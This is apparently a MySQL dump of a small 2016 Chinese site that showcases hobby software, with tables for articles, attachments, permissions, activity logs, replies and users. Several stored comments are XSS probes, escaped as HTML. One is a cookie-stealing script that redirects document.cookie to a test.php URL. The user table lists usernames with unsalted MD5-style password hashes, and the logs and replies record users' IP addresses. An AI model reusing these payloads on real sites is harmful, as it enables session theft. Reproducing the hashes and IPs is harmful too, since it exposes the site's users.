...
MySQL - 5.1.73-community : Database - qwqoffice
*********************************************************************
*/
...
CREATE DATABASE /*!32312 IF NOT EXISTS*/`qwqoffice` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `qwqoffice`;

/*Table structure for table `qo_article` */

DROP TABLE IF EXISTS `qo_article`;

CREATE TABLE `qo_article` (
...
/*Data for the table `qo_attach` */

insert  into `qo_attach`(`AID`,`Author`,`FileSize`,`FileName`,`RealFileName`,`DownCount`) values (1,'1','156.64 KB','Chat_20150901.zip','attached/file/20160223/bcparnrbovpkgsto.zip',2),(2,'1','5.27 MB','JigsawPuzzle_20151229.zip','attached/file/20160224/cwoowlpmihivjcmy.zip',21),(3,'1','1.58 MB','ThoughtReader_20151215.zip','attached/file/20160224/zzzhaspsctmabcfx.zip',2),(4,'1','659.84 KB','Hanoi_20151015.zip','attached/file/20160227/awxnqyftftipgmlz.zip',0),(5,'1','6.23 MB','NewsPublisher_20160106.zip','attached/file/20160302/qkzunfvrnuxmsuxp.zip',3);

/*Table structure for table `qo_authority` */

DROP TABLE IF EXISTS `qo_authority`;

CREATE TABLE `qo_authority` (
...
/*Data for the table `qo_authority` */

insert  into `qo_authority`(`AuthID`,`AuthName`) values (1,'Comment'),(3,'Download'),(2,'Manage'),(9,'NoPend'),(8,'NoValidateCode'),(7,'Register'),(4,'Search'),(5,'SendMessage'),(6,'VisitUserHome');

/*Table structure for table `qo_class` */

DROP TABLE IF EXISTS `qo_class`;

CREATE TABLE `qo_class` (
...
/*Data for the table `qo_class` */

insert  into `qo_class`(`CID`,`ClassName`,`Link`,`Parent`,`Sequence`) values (1,'Windows应用','',0,1),(2,'Web应用','',0,2),(3,'移动应用','',0,3),(4,'Java','',1,1),(5,'C#','',1,2),(6,'VB6','',1,3),(7,'PHP','',2,1),(8,'ASP.NET','',2,2),(9,'JavaScript','',2,4),(10,'Android','',3,1),(11,'主页','index.php',0,0),(12,'反馈','article.php?mod=view&amp;tid=2',0,4),(13,'HTML','',2,3);

/*Table structure for table `qo_group` */

DROP TABLE IF EXISTS `qo_group`;

CREATE TABLE `qo_group` (
...
/*Data for the table `qo_group` */

insert  into `qo_group`(`GID`,`GroupName`,`Authority`) values (1,'管理员','1;2;3;4;5;6;7;8;9'),(2,'普通会员','1;3;4;5;6;7'),(3,'游客','1;4;6;7'),(4,'测试管理员','1;2;3;4;5;6;7;8;9');

/*Table structure for table `qo_indeximg` */

DROP TABLE IF EXISTS `qo_indeximg`;

CREATE TABLE `qo_indeximg` (
  `NO` int(10) NOT NULL,
...
/*Data for the table `qo_indeximg` */

insert  into `qo_indeximg`(`NO`,`Sequence`,`Title`,`Link`,`FileName`) values (1,1,'Blown个人博客系统','article.php?mod=view&amp;tid=7','20160403-2.png'),(2,2,'Jigsaw Puzzle拼图游戏','article.php?mod=view&amp;tid=3','20160403-1.png'),(3,3,'Magic Chat Suite聊天系统','article.php?mod=view&amp;tid=1','20160403-3.png');

/*Table structure for table `qo_logs` */

DROP TABLE IF EXISTS `qo_logs`;
...
/*Data for the table `qo_logs` */

insert  into `qo_logs`(`LID`,`UID`,`IP`,`Time`,`Action`) values (1,1,'14.29.91.91','2016-02-23 15:12:12','登录用户{幻想小籽}'),(2,3,'182.139.134.99','2016-02-23 18:00:01','注册用户{liangzm}'),(3,2,'14.29.91.91','2016-02-23 18:54:24','登录用户{QDY}'),(4,1,'112.96.106.178','2016-02-23 19:11:17','下载附件{Chat_20150901.zip}'),(5,2,'14.29.91.91','2016-02-23 21:32:59','登录用户{QDY}'),(6,4,'125.34.52.133','2016-02-23 23:08:07','注册用户{小黑公主}'),(7,5,'14.147.4.133','2016-02-23 23:12:21','注册用户{我才是星辰}'),(8,1,'14.29.91.91','2016-02-23 23:58:39','登录用户{幻想小籽}'),(9,5,'14.147.4.133','2016-02-24 00:23:28','登录用户{我才是星辰}'),(10,2,'59.37.147.84','2016-02-24 11:59:55','下载附件{JigsawPuzzle_20151229.zip}'),(11,2,'14.17.37.69','2016-02-24 12:13:06','登录用户{QDY}'),(12,2,'14.17.37.43','2016-02-24 12:13:24','下载附件{JigsawPuzzle_20151229.zip}'),(13,2,'59.37.147.84','2016-02-24 12:13:25','下载附件{JigsawPuzzle_20151229.zip}'),(32,2,'59.37.147.84','2016-02-24 13:32:02','下载附件{ThoughtReader_20151215.zip}'),(33,1,'59.37.147.84','2016-02-24 15:53:37','登录用户{幻想小籽}'),(34,2,'59.37.147.84','2016-02-24 19:05:14','下载附件{ThoughtReader_20151215.zip}'),(35,1,'112.96.176.175','2016-02-25 14:49:45','下载附件{ThoughtReader_20151215.zip}'),(36,1,'112.96.176.175','2016-02-25 14:49:55','下载附件{ThoughtReader_20151215.zip}'),(37,1,'153.35.90.230','2016-02-25 14:49:59','下载附件{ThoughtReader_20151215.zip}'),(38,1,'121.41.48.83','2016-02-25 14:50:07','下载附件{ThoughtReader_20151215.zip}'),(39,1,'122.13.132.199','2016-02-28 15:19:21','登录用户{幻想小籽}'),(40,1,'121.32.26.106','2016-02-29 07:57:08','登录用户{幻想小籽}'),(41,1,'121.32.26.106','2016-02-29 09:50:01','登录用户{幻想小籽}'),(42,1,'121.32.26.106','2016-03-01 10:42:06','登录用户{幻想小籽}'),(43,1,'14.23.170.66','2016-03-07 09:55:08','下载附件{NewsPublisher_20160106.zip}'),(44,1,'122.228.18.147','2016-03-11 23:06:27','下载附件{NewsPublisher_20160106.zip}'),(45,1,'221.204.207.41','2016-03-12 13:27:37','下载附件{NewsPublisher_20160106.zip}'),(46,1,'-','2016-03-20 15:09:00','下载附件{Hanoi_20151015.zip}'),(47,1,'-','2016-03-22 11:15:00','登录用户{幻想小籽}'),(48,6,'-','2016-03-25 10:43:59','登录用户{111}'),(49,1,'-','2016-03-25 14:37:38','登录用户{幻想小籽}'),(50,1,'219.222.214.35','2016-03-25 16:12:31','登录用户{幻想小籽}'),(51,1,'14.215.33.19','2016-03-25 16:51:01','登录用户{幻想小籽}'),(52,1,'14.215.43.82','2016-03-27 11:55:05','登录用户{幻想小籽}'),(53,1,'14.215.62.40','2016-03-27 11:58:18','登录用户{幻想小籽}'),(54,6,'219.137.26.162','2016-03-29 16:51:55','注册用户{ttt}'),(55,6,'219.137.26.162','2016-03-29 16:52:42','登录用户{ttt}'),(56,6,'219.137.26.162','2016-03-29 16:53:55','下载附件{NewsPublisher_20160106.zip}'),(57,7,'113.74.234.215','2016-03-29 18:31:53','注册用户{aaaa}'),(58,8,'113.74.234.215','2016-03-29 18:38:22','注册用户{aaa}'),(59,9,'183.6.31.102','2016-03-29 20:17:52','注册用户{123456}'),(60,10,'112.96.164.111','2016-03-29 21:17:38','注册用户{123}'),(61,11,'183.6.31.160','2016-03-29 22:20:31','注册用户{222333}'),(62,12,'182.151.230.60','2016-03-30 16:55:41','注册用户{赵洪川}'),(63,13,'113.107.26.239','2016-03-30 23:25:00','注册用户{1234}'),(64,1,'14.215.40.112','2016-04-01 08:13:20','登录用户{幻想小籽}'),(65,14,'115.172.97.61','2016-04-01 22:59:38','注册用户{llh}'),(66,1,'219.222.214.35','2016-04-02 23:22:55','登录用户{幻想小籽}'),(67,15,'-','2016-04-03 15:33:06','登录用户{TestAdmin}'),(68,16,'61.140.154.92','2016-04-03 22:54:00','注册用户{123456654}'),(69,17,'111.181.2.131','2016-04-05 11:04:56','注册用户{123456789}'),(70,18,'183.6.31.106','2016-04-08 10:36:07','注册用户{789}'),(71,18,'183.6.31.106','2016-04-08 10:36:49','登录用户{789}'),(72,19,'113.108.201.170','2016-04-13 16:07:17','注册用户{1747800952}'),(73,1,'219.222.214.32','2016-04-13 17:35:43','登录用户{幻想小籽}'),(74,20,'101.107.85.96','2016-04-14 16:53:42','注册用户{124}');

/*Table structure for table `qo_message` */

DROP TABLE IF EXISTS `qo_message`;

CREATE TABLE `qo_message` (
...
/*Data for the table `qo_message` */

/*Table structure for table `qo_notice` */

DROP TABLE IF EXISTS `qo_notice`;

CREATE TABLE `qo_notice` (
...
/*Data for the table `qo_notice` */

insert  into `qo_notice`(`NID`,`UID`,`Title`,`NoticeType`,`Content`,`Time`,`Status`) values (1,1,'<span class=\"bolder\" style=\"color: rgb(204, 51, 229);\">Blown个人博客系统发布啦！</span>','String','大致的功能已经开发完成。\r\n持续更新中。。。\r\n比赛过后开源','2016-04-11 23:17:26','Show'),(2,1,'<span class=\"bolder\" style=\"color: rgb(255, 153, 0);\">消息系统上线！回帖可收到通知！</span>','String','在资料页面可发送短消息，别人回帖时能收到通知。隐私设置新增是否接收短消息。','2016-04-24 15:53:55','Show');

/*Table structure for table `qo_reply` */

DROP TABLE IF EXISTS `qo_reply`;

CREATE TABLE `qo_reply` (
  ...
  CONSTRAINT `qo_reply_ibfk_1` FOREIGN KEY (`TID`) REFERENCES `qo_article` (`TID`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8;

/*Data for the table `qo_reply` */

insert  into `qo_reply`(`RID`,`TID`,`UID`,`VisitorName`,`Quote`,`ReplyContent`,`Time`,`ReplyIP`,`Status`) values (1,2,NULL,'YXM',NULL,'软件的孩子都这么厉害的吗','2016-02-25 14:13:23','-','通过'),(3,4,NULL,'ZJW',NULL,'打唔开水晶球','2016-02-26 13:15:00','-','通过'),(4,4,NULL,'森哥',NULL,'那些符号代表什么意思？有什么意义？','2016-02-27 09:58:52','-','通过'),(5,4,1,NULL,4,'有的是十二星座的符号<br />没什么意义，只是用来区分，什么图案都可以','2016-02-27 12:03:09','-','通过'),(9,4,NULL,'哼',NULL,'根本打不开，垃圾软件。大家千万别下！','2016-02-28 15:01:22','-','不通过'),(10,6,NULL,'不告诉你',NULL,'演示地址什么时候放出？','2016-03-05 18:02:18','59.37.144.28','通过'),(11,6,1,NULL,10,'现在好了','2016-03-06 21:36:12','122.13.132.203','通过'),(12,6,6,NULL,NULL,'ttt','2016-03-29 16:53:37','219.137.26.162','通过'),(13,2,NULL,'我是黑客',NULL,'&lt;script&gt;<br />for(var i=0;i&lt;10;i++){<br />  alert(&quot;测试&quot;);<br />}<br />&lt;/script&gt;','2016-03-29 18:37:17','113.74.234.215','通过'),(14,2,NULL,'greg',NULL,'dg','2016-03-29 18:37:38','113.74.234.215','通过'),(15,2,8,NULL,NULL,'&lt;script&gt;<br />for(var i=0;i&lt;10;i++){<br />alert(&quot;test&quot;);<br />}<br /><br />&lt;/script&gt;','2016-03-29 18:39:31','113.74.234.215','通过'),(16,1,NULL,'zlh',NULL,'测试','2016-03-29 20:52:50','183.13.72.223','通过'),(17,6,NULL,'呢',NULL,'gn','2016-03-29 22:19:47','183.6.31.160','通过'),(18,2,11,NULL,NULL,'我发','2016-03-29 22:21:05','183.6.31.160','通过'),(19,2,NULL,'',NULL,' ','2016-03-29 22:33:15','111.22.8.129','不通过'),(20,1,NULL,'测定',16,'测出的撒旦发射点发','2016-03-30 08:46:53','58.252.69.227','通过'),(21,7,NULL,'weq',NULL,'rewqewqeqe','2016-03-30 22:16:46','183.6.31.133','通过'),(22,1,NULL,'ww',NULL,'dddddd','2016-03-31 17:34:46','113.104.33.222','通过'),(23,1,8,NULL,NULL,'&lt;script&gt;alert(&quot;454&quot;)&lt;/script&gt;','2016-04-02 18:52:35','113.74.234.235','通过'),(24,2,NULL,'111',NULL,'很好很好很好','2016-04-02 19:21:25','202.104.157.198','通过'),(25,1,NULL,'a',20,'aaaaaa','2016-04-03 11:45:35','58.255.228.180','通过'),(26,2,NULL,'r',15,'&lt;script&gt;<br />for(var i=0;i&lt;10;i++){<br />alert(&quot;test&quot;);<br />}<br /><br />&lt;/script&gt;','2016-04-03 22:52:22','61.140.154.92','通过'),(27,4,16,NULL,NULL,'当重复两次后就错误了<br />什么原理？','2016-04-03 23:00:52','61.140.154.92','通过'),(28,2,16,NULL,NULL,'&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(\'师兄来攻击\')&lt;/script&gt;','2016-04-03 23:03:02','61.140.154.92','通过'),(29,2,NULL,'游客',NULL,'&lt;script&gt;document.location = \'http://localhost/test.php?cookie=\' + document.cookie;&lt;/script&gt;','2016-04-03 23:09:41','61.140.154.92','通过'),(30,4,1,NULL,27,'这个是不会有错的，除非是你计算过程中出现错误，结果自然就是错的','2016-04-03 23:39:36','124.174.131.53','通过'),(31,2,NULL,'vdr',NULL,'vrxdvrxdvrxdvrxd','2016-04-05 11:04:01','183.54.240.67','通过'),(32,9,17,NULL,NULL,'很不错啊 ！！！！','2016-04-05 11:06:01','111.181.2.131','通过'),(33,2,NULL,'fasdfdsf',NULL,'fsdafdsadasdas','2016-04-06 09:28:12','121.33.226.172','通过'),(34,7,NULL,'xxx',NULL,'bjdkaewhnk','2016-04-06 16:15:57','219.222.214.33','通过'),(35,7,NULL,'ccc',NULL,'gjhgkcxvz','2016-04-06 16:16:29','219.222.214.33','通过'),(36,6,NULL,'asd',NULL,'asdasdasdasd','2016-04-13 16:06:35','113.108.201.170','通过');

/*Table structure for table `qo_setting` */

DROP TABLE IF EXISTS `qo_setting`;

CREATE TABLE `qo_setting` (
...
/*Data for the table `qo_setting` */

insert  into `qo_setting`(`Name`,`Value`) values ('AdminGroup','1'),('AllowComment','YES'),('AllowRegister','YES'),('AllowVisit','YES'),('DefaultGroup','2'),('RootUser','1'),('TestAdminGroup','4'),('VisitorGroup','3');

/*Table structure for table `qo_user` */

DROP TABLE IF EXISTS `qo_user`;

CREATE TABLE `qo_user` (
...
/*Data for the table `qo_user` */

insert  into `qo_user`(`UID`,`GID`,`Username`,`Password`,`RegIP`,`RegDate`,`LastLogin`,`Privacy`) values (1,1,'幻想小籽','49c7823dad1ea980405dd6909b15d04d','-','2016-02-01 12:00:00','2016-04-24 23:48:09','Home;Msg'),(2,2,'QDY','3932a1c32e6bfe5369b3db586370b5a9','-','2016-02-23 16:58:41','2016-02-28 14:59:47','Home;Msg'),(3,2,'liangzm','85abc4cca4498e7e1d2dd33158a4d7a1','182.139.134.99','2016-02-23 18:00:01','2016-02-23 18:05:30','Home;Msg'),(4,2,'小黑公主','acd11ebad04deef19903433529961aac','125.34.52.133','2016-02-23 23:08:07','2016-02-23 23:56:12','Home;Msg'),(5,2,'我才是星辰','ab900ee8670cad291f607c00ff2d458b','14.147.4.133','2016-02-23 23:12:21','2016-02-24 00:47:24','Home;Msg'),(6,2,'ttt','0999525a84a48dd630439156954511a0','219.137.26.162','2016-03-29 16:51:55','2016-03-29 16:53:39','Home;Msg'),(7,2,'aaaa','20bc10eda57bf2cf41f2d44a45c03ee3','113.74.234.215','2016-03-29 18:31:53','2016-03-29 18:33:07','Home;Msg'),(8,2,'aaa','0999525a84a48dd630439156954511a0','113.74.234.215','2016-03-29 18:38:22','2016-04-04 10:23:17','Home;Msg'),(9,2,'123456','0999525a84a48dd630439156954511a0','183.6.31.102','2016-03-29 20:17:52','2016-03-29 20:18:15','Home;Msg'),(10,2,'123','0999525a84a48dd630439156954511a0','112.96.164.111','2016-03-29 21:17:38','2016-03-29 21:17:54','Home;Msg'),(11,2,'222333','762a82f9c81f25384dad934f98ae0b91','183.6.31.160','2016-03-29 22:20:31','2016-03-29 22:21:07','Home;Msg'),(12,2,'赵洪川','31c65a78cd92560f2ea10eaec76d2561','182.151.230.60','2016-03-30 16:55:41','2016-03-30 16:57:34','Home;Msg'),(13,2,'1234','25b08f95b5508094d32c4c8108dd0b9d','113.107.26.239','2016-03-30 23:25:00','2016-04-01 15:40:46','Home;Msg'),(14,2,'llh','8f793b60dd65451d66a5dbd388b560b2','115.172.97.61','2016-04-01 22:59:38','2016-04-01 23:00:12','Home;Msg'),(15,4,'TestAdmin','6e348a3609585ec34377803eb8fe2548','-','2016-04-03 15:32:20','2016-04-03 15:35:25','Home;Msg'),(16,2,'123456654','0999525a84a48dd630439156954511a0','61.140.154.92','2016-04-03 22:54:00','2016-04-03 23:03:04','Home;Msg'),(17,2,'123456789','0999525a84a48dd630439156954511a0','111.181.2.131','2016-04-05 11:04:56','2016-04-05 11:06:25','Home;Msg'),(18,2,'789','0999525a84a48dd630439156954511a0','183.6.31.106','2016-04-08 10:36:07','2016-04-08 11:06:00','Home;Msg'),(19,2,'1747800952','287f73dc3ca78f28c051ede90230560b','113.108.201.170','2016-04-13 16:07:17','2016-04-13 16:07:30','Home;Msg'),(20,2,'124','e0291c87d3ce38299ba3a9982bd8936a','101.107.85.96','2016-04-14 16:53:42','2016-04-14 16:54:04','Home;Msg'),(21,2,'Resmic','689f74ff718d015214466da7fdb0f8da','119.131.153.116','2016-04-10 22:23:34','2016-04-10 22:54:25','Home;Msg');
